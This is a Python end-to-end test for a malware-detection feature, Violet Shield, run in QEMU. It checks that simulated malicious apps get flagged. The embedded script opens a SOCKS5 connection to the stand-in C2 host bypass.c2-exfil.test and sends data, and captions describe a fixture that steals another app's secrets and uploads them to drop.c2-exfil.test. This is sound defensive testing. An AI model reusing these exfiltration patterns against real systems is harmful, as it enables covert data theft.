"""Violet Shield end to end: VioletOS in QEMU with the Python companion simulator.

    build/shield/venv/bin/python targets/qemu/test_shield.py [--record DIR]

QEMU runs the Open Runtime with the built-in apps plus apps/shield-demo. Every TCP
connection the guest makes goes through the companion's SOCKS5 relay
(tools/net_relay.py, VIOLET_NET_SOCKS), exactly like Phone Internet mode on the
handset, and the Sentinel links to `sentinel.violet` on the companion.

A scripted viewer taps through the demo and checks the Open Runtime's log:
  1. A benign notes fixture runs and gets scored.
  2. Photosync's fixture upload is flagged while the upload completes.
  3. Themes' cross-app write attempt is reported as a warning.
  4. An unreported fixture connection is flagged by the relay.
"""
from __future__ import annotations

import argparse
import http.server
import json
import os
import socket
import socketserver
import subprocess
import sys
import threading
import time
from pathlib import Path
from tempfile import TemporaryDirectory

ROOT = Path(__file__).resolve().parents[2]
sys.path.insert(0, str(ROOT / "tools"))
sys.path.insert(0, str(ROOT / "targets/qemu"))
import home_grid  # noqa: E402
import run  # noqa: E402

# The demo apps (apps/shield-demo) get icons on Home after the built-in ones.
APPS = ["music", "notes", "photosync", "themes"]
SKIP = ""

SCRIPT = r'''#!PYTHON
import json, mmap, os, socket, struct, sys, time
ram = open(sys.argv[1], "r+b")
log = mmap.mmap(ram.fileno(), 0x10000, offset=0x49220000 - 0x40000000)
screen = mmap.mmap(ram.fileno(), 720 * 1600 * 4, offset=0x79450000 - 0x40000000, prot=mmap.PROT_READ)
APPS = json.loads(os.environ["SHIELD_APPS"])
STATUS = os.environ["SHIELD_STATUS"]
SOCKS = int(os.environ["SHIELD_SOCKS_PORT"])
REC = os.environ.get("SHIELD_RECORD")
frames = open(os.path.join(REC, "qemu.bgra"), "wb") if REC else None
events = open(os.path.join(REC, "qemu.jsonl"), "w") if REC else None
t0 = time.time()
last_frame = 0.0
caption_text = ""

def text():
    n = struct.unpack_from("<I", log, 4)[0]
    data = bytes(log[8:4096])
    if n <= len(data):
        return data[:n].decode(errors="replace")
    s = n % len(data)
    return (data[s:] + data[:s]).decode(errors="replace")
seen = ""
def everything():
    global seen
    t = text()
    for k in range(min(len(seen), len(t)), 0, -1):
        if seen.endswith(t[:k]):
            seen += t[k:]
            return seen
    seen += t
    return seen
def frame():
    # Half-size frames for the demo video, about 6 a second.
    global last_frame
    if not frames or time.time() - last_frame < 0.16:
        return
    last_frame = time.time()
    import numpy as np
    a = np.frombuffer(screen, dtype=np.uint8).reshape(1600, 720, 4)[::2, ::2]
    frames.write(a.tobytes())
    events.write(json.dumps({"t": round(time.time() - t0, 3), "caption": caption_text,
                             "log": everything().splitlines()[-14:]}) + "\n")
def caption(s):
    global caption_text
    caption_text = s
    print("shield demo:", s, file=sys.stderr)
def fail(why):
    print("shield test failed:", why, "\n--- log ---\n" + everything()[-6000:], file=sys.stderr)
    sys.exit(1)
def until(what, check, timeout=30.0):
    deadline = time.monotonic() + timeout
    while time.monotonic() < deadline:
        if check():
            return
        frame()
        time.sleep(0.04)
    fail(what)
def hold(seconds):
    end = time.monotonic() + seconds
    while time.monotonic() < end:
        frame()
        time.sleep(0.04)
def tap(x, y):
    os.write(1, bytes([9, x >> 4, y >> 4, ((x & 15) << 4) | (y & 15), 1, 1]))
    hold(.15); os.write(1, bytes(6)); hold(.35)
def pixel(x, y):
    return struct.unpack_from("<I", screen, (y * 720 + x) * 4)[0]
def on_home():
    # Home logs each time it comes to the front.
    return home_shown() > seen_home[0]
seen_home = [0]
def mark():
    seen_home[0] = home_shown()
def open_apps():
    pass
def back_home():
    # Holding the top edge for a second leaves the app in front.
    mark()
    os.write(1, bytes([9, 360 >> 4, 20 >> 4, ((360 & 15) << 4) | (20 & 15), 1, 1]))
    hold(1.4); os.write(1, bytes(6)); hold(.5)
    until("Home", on_home, 10)
def start(name):
    mark()
    open_icon(name)
def status():
    try:
        return json.load(open(STATUS))
    except (OSError, ValueError):
        return {}
def decisions(app):
    return [d for d in status().get("decisions", []) if d.get("app") == app]
def count(s):
    return everything().count(s)

until("Open Runtime ready", lambda: "[open] ready" in everything(), 90)
caption("VioletOS boots on seL4 in QEMU; its Sentinel links to the companion simulator")
until("Sentinel links to the companion", lambda: "sentinel: linked" in everything(), 90)
caption("notes: an ordinary app saves notes (with an API key) and syncs to its server")
start("notes")
until("notes runs", lambda: "notes done" in everything(), 90)
until("Home after notes", on_home, 15)
open_apps()
caption("Home fetches the time for your city from wttr.in")
caption("The companion scores each app's telemetry window on the phone: benign, nothing blocked")
until("benign verdicts", lambda: decisions("notes") and decisions("home"), 90)
hold(3)
open_apps()

caption("photosync: 'syncs photos', then quietly reads notes' secrets...")
start("photosync")
until("photosync hides", lambda: "going to the background" in everything(), 90)
until("Home", on_home, 15)
caption("...slips into the background and uploads 4 MiB to drop.c2-exfil.test")
until("photosync warning", lambda: any(d.get("warned") for d in decisions("photosync")), 120)
until("signed warning verified by VioletOS", lambda: "op 6 seq" in everything(), 30)
caption("The model warns on Home while photosync keeps running")
hold(4)

caption("themes: maps W+X memory, then tries to overwrite Home's program, /apps/home")
open_apps()
start("themes")
until("themes warning", lambda: any(d.get("warned") for d in decisions("themes")), 60)
caption("Violet Shield flags the write on Home")
hold(5)
back_home()
hold(4)

caption("A connection the Sentinel never reported (tampered telemetry) reaches the relay...")
s = socket.create_connection(("127.0.0.1", SOCKS), timeout=10)
s.sendall(b"\x05\x01\x02"); s.recv(2)
user, pw = b"violet", os.environ["SHIELD_PASS"].encode()
s.sendall(bytes([1, len(user)]) + user + bytes([len(pw)]) + pw); s.recv(2)
host = b"bypass.c2-exfil.test"
s.sendall(b"\x05\x01\x00\x03" + bytes([len(host)]) + host + struct.pack(">H", 443))
s.recv(10)
try:
    s.sendall(b"x" * 20000)
except OSError:
    pass
until("unreported connection warning", lambda: any(d.get("warned") for d in decisions("unattributed")), 40)
caption("...and is flagged as unattributed by the relay")
hold(6)
s.close()
caption("Violet Shield: local model and signed Home warnings")
hold(3)
print("shield scripted run complete", file=sys.stderr)
'''


def sink_server():
    """drop.c2-exfil.test and bypass.c2-exfil.test: count what arrives, keep nothing."""
    got = {"bytes": 0}

    class Sink(socketserver.BaseRequestHandler):
        def handle(self):
            while True:
                d = self.request.recv(65536)
                if not d:
                    break
                got["bytes"] += len(d)

    srv = socketserver.ThreadingTCPServer(("127.0.0.1", 0), Sink)
    srv.daemon_threads = True
    threading.Thread(target=srv.serve_forever, daemon=True).start()
    return srv, got


def web_server():
    class Page(http.server.BaseHTTPRequestHandler):
        def reply(self):
            body = b'{"city": "Violet Bay", "forecast": "sunny, 21C"}' if "forecast" in self.path else b"OK synced\n"
            self.send_response(200)
            self.send_header("Content-Length", str(len(body)))
            self.end_headers()
            self.wfile.write(body)

        do_GET = reply

        def do_POST(self):
            self.rfile.read(int(self.headers.get("Content-Length") or 0))
            self.reply()

        def log_message(self, *a):
            pass

    srv = socketserver.ThreadingTCPServer(("127.0.0.1", 0), Page)
    srv.daemon_threads = True
    threading.Thread(target=srv.serve_forever, daemon=True).start()
    return srv


def build_image(out: Path):
    env = dict(os.environ, VIOLET_OPEN_EXTRA_APPS=str(ROOT / "apps/shield-demo"), VIOLET_OPEN_SKIP=SKIP)
    subprocess.run([sys.executable, str(ROOT / "tools/build_initfs.py"), str(out)], env=env, check=True)
    titled = listed_titles(out.read_bytes())
    if titled:
        APPS[:] = titled


def listed_titles(cpio: bytes):
    """The app names in apps/.home of a newc archive, in the shell's order."""
    at = 0
    while cpio[at:at + 6] == b"070701":
        size, namesize = int(cpio[at + 54:at + 62], 16), int(cpio[at + 94:at + 102], 16)
        name = cpio[at + 110:at + 110 + namesize - 1]
        data = ((at + 110 + namesize + 3) & ~3)
        if name == b"apps/.home":
            return [line.split("\t")[0] for line in cpio[data:data + size].decode().splitlines() if "\t" in line]
        if name == b"TRAILER!!!":
            break
        at = (data + size + 3) & ~3
    return []


def start_sim(host_map, tmp: Path):
    port = free_port()
    status = tmp / "shield-status.json"
    proc = subprocess.Popen([str(ROOT / "build/shield/venv/bin/python"), str(ROOT / "tools/shield-trainer/companion_sim.py"), "--port", str(port),
                             "--model", "--status", str(status), "--host-map", json.dumps(host_map),
                             "--record", str(tmp / "records.jsonl")])
    deadline = time.time() + 120
    while time.time() < deadline:
        try:
            socket.create_connection(("127.0.0.1", port), timeout=1).close()
            return port, status, proc
        except OSError:
            time.sleep(0.5)
    raise SystemExit("companion_sim did not start")


def free_port():
    s = socket.socket()
    s.bind(("127.0.0.1", 0))
    p = s.getsockname()[1]
    s.close()
    return p


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--record", help="directory for the demo recording (frames and captions)")
    args = ap.parse_args()
    original = ROOT / "build/sel4/qemu"
    if not (original / "zImage").exists():
        raise SystemExit("Build the QEMU image first (make qemu-image).")
    record = Path(args.record).resolve() if args.record else None
    if record:
        record.mkdir(parents=True, exist_ok=True)
    (ROOT / "build/shield/qemu-traces").mkdir(parents=True, exist_ok=True)
    sink, got = sink_server()
    web = web_server()
    host_map = {"drop.c2-exfil.test": f"127.0.0.1:{sink.server_address[1]}", "bypass.c2-exfil.test": f"127.0.0.1:{sink.server_address[1]}",
                "api.weather.test": f"127.0.0.1:{web.server_address[1]}", "sync.notes.test": f"127.0.0.1:{web.server_address[1]}"}
    with TemporaryDirectory(prefix="vs-", dir=os.environ.get("TMPDIR", "/tmp")) as tmp:
        tmp = Path(tmp)
        image = tmp / "image"
        image.mkdir()
        for name in ("zImage", "handoff.dtb", "entry.bin"):
            (image / name).symlink_to(original / name)
        build_image(image / "initfs.cpio")
        run.IMAGE = image
        # machine() took build/sel4/qemu as its default when tools/run.py was imported.
        import functools
        run.machine = functools.partial(run.machine, image)
        port, status, helper = start_sim(host_map, tmp)
        viewer = tmp / "viewer.py"
        script = SCRIPT.replace("#!PYTHON", "#!" + str(ROOT / "build/shield/venv/bin/python"))
        viewer.write_text(home_grid.viewer(script, (image / "initfs.cpio").read_bytes()))
        viewer.chmod(0o755)
        os.environ.update(VIOLET_NET_SOCKS=f"127.0.0.1:{port}", VIOLET_NET_SOCKS_PASS="violet-dev", SHIELD_APPS=json.dumps(APPS),
                          SHIELD_STATUS=str(status), SHIELD_SOCKS_PORT=str(port), SHIELD_PASS="violet-dev")
        if record:
            os.environ["SHIELD_RECORD"] = str(record)
            (record / "qemu.start").write_text(str(time.time()))
        try:
            code = run.main(str(viewer))
        finally:
            helper.terminate()
        st = json.loads(Path(status).read_text())
        # The companion's decisions, with each scored window, for a look after the run.
        (ROOT / "build/shield/last-status.json").write_text(json.dumps(st, indent=1))
        if record:
            (record / "shield-status.json").write_text(json.dumps(st, indent=1))
    problems = []
    if code != 0:
        problems.append(f"scripted run exited with {code}")
    by_app = {}
    for d in st.get("decisions", []):
        by_app.setdefault(d["app"], []).append(d)
    if any(d.get("contained") for d in st.get("decisions", [])):
        problems.append("monitoring mode contained an app")
    for app in ("photosync", "themes", "unattributed"):
        if not any(d.get("warned") for d in by_app.get(app, [])):
            problems.append(f"{app} warning was not sent")
    if got["bytes"] < 4 * 1024 * 1024:
        problems.append(f"the fixture upload was interrupted ({got['bytes']} bytes)")
    if not st.get("shields_accepted"):
        problems.append("no signed warning was accepted")
    if st.get("shields_rejected"):
        problems.append(f"VioletOS rejected {st['shields_rejected']} Shields")
    print(f"sink received {got['bytes'] // 1024} KiB of photosync's 4096 KiB", file=sys.stderr)
    for app, ds in sorted(by_app.items()):
        d = next((x for x in ds if x.get("warned")), ds[0])
        print(f"  {app:12s} {d['tier']:6s} {d['verdict']:22s} p_mal={d['p_malicious']:.2f} {d['action']:10s}"
              f" {'WARNED' if d.get('warned') else ''} {d.get('note', '')[:90]}", file=sys.stderr)
    print(f"  shields sent {st.get('shields_sent')} verified {st.get('shields_accepted')} rejected {st.get('shields_rejected')}", file=sys.stderr)
    if problems:
        print("Violet Shield test FAILED:\n  " + "\n  ".join(problems), file=sys.stderr)
        sys.exit(1)
    print("Violet Shield verified end to end", file=sys.stderr)


if __name__ == "__main__":
    main()
